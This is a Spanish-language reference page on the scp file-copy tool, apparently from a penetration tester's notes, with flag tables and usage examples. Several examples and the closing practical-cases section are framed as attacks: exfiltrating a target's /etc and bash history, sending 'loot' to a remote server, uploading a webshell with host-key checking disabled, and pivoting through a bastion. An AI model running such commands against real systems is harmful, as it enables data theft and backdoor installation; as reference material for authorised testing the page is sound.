# scp

**`scp`** copia ficheros entre hosts sobre una conexión SSH cifrada. Toma rutas locales y remotas con la sintaxis `[user@]host:ruta`; permite local→remoto, remoto→local y remoto→remoto. Desde OpenSSH 9.0 el backend por defecto es el **protocolo SFTP** (no el antiguo protocolo `rcp`), lo que evita fallos de expansión de globs por el shell remoto. La mayoría de opciones son idénticas o análogas a las de [[ssh]].

Parte del índice de la suite: [[OpenSSH]].

```
scp [opciones] origen ... destino
# Local  → Remoto :  scp file            user@host:/ruta/
# Remoto → Local  :  scp user@host:/file ./destino/
# Remoto → Remoto :  scp u1@h1:/orig     u2@h2:/dest/
```

---

## Selección de ficheros y ruta

| Flag | Función | Ejemplo |
| --- | --- | --- |
| `-r` | Copia recursiva de directorios. | `scp -r user@host:/var/www/ ./backup/` |
| `-p` | Preserva mtime, atime, permisos y modos. | `scp -p user@host:/etc/passwd ./` |
| `-P port` | Puerto SSH distinto de 22 (mayúscula: en `ssh` es minúscula). | `scp -P 2222 file user@host:/tmp/` |
| `-3` | Fuerza que el tráfico remoto→remoto pase por el host local. | `scp -3 u1@h1:/f u2@h2:/dst` |
| `-R` | Copia remoto→remoto ejecutando `scp` en el origen (default es vía local). | `scp -R u1@h1:/f u2@h2:/dst` |
| `-T` | Desactiva comprobaciones anti wildcard del lado servidor (legacy). | `scp -T user@host:'/tmp/*.log' ./` |
| `-O` | Usa el protocolo `scp`/rcp legacy en vez de SFTP. | `scp -O file user@oldhost:/tmp/` |

---

## Autenticación y conexión

| Flag | Función | Ejemplo |
| --- | --- | --- |
| `-i identity_file` | Clave privada específica. | `scp -i ~/.ssh/id_ed25519 file user@host:/tmp/` |
| `-F ssh_config` | Fichero de configuración SSH alternativo. | `scp -F ./ops.cfg file user@host:/tmp/` |
| `-o ssh_option` | Cualquier opción de `ssh_config(5)` (ProxyJump, StrictHostKeyChecking...). | `scp -o "ProxyJump user@bastion" file internal:/tmp/` |
| `-J destino` | ProxyJump directo (salto por bastión). | `scp -J user@bastion file user@internal:/tmp/` |
| `-S program` | Programa a usar para la conexión cifrada. | `scp -S /usr/bin/ssh file user@host:/tmp/` |
| `-B` | Modo batch: no pide contraseñas ni passphrases (falla si las necesita). | `scp -B file user@host:/tmp/` |

---

## Cifrado, rendimiento y límites

| Flag | Función | Ejemplo |
| --- | --- | --- |
| `-C` | Habilita compresión (enlaces lentos). | `scp -C bigfile.tar.gz user@host:/tmp/` |
| `-c cipher` | Fuerza un algoritmo de cifrado (servers antiguos o velocidad). | `scp -c aes128-ctr file user@host:/tmp/` |
| `-l limit` | Limita el ancho de banda en **Kbit/s**. | `scp -l 4096 bigfile user@host:/tmp/` |

---

## Salida y diagnóstico

| Flag | Función | Ejemplo |
| --- | --- | --- |
| `-q` | Modo silencioso (sin barra de progreso ni warnings). | `scp -q loot.db user@1.1.1.1:~/` |
| `-v` | Verbose (depuración del handshake y la transferencia). | `scp -v user@host:/root/.bash_history ./` |
| `-A` | Reenvía el `ssh-agent` a la conexión (para saltos que lo requieran). | `scp -A file user@bastion:/tmp/` |

---

## Casos prácticos

```bash
# Exfiltrar /etc completo
scp -r root@10.10.10.50:/etc ./loot/

# Subir webshell sin prompts de host key
scp -i id_rsa -o StrictHostKeyChecking=no shell.php user@target:/var/www/html/

# Pivoting a través de bastión
scp -o "ProxyJump user@bastion" loot.db user@internal:/tmp/

# Transferencia con límite de banda (no saturar el enlace de la víctima)
scp -l 2048 -C dump.sql user@vps:~/
```

Ver también [[ssh]] · [[sftp]] · [[SSHFS]] · [[rsync]].
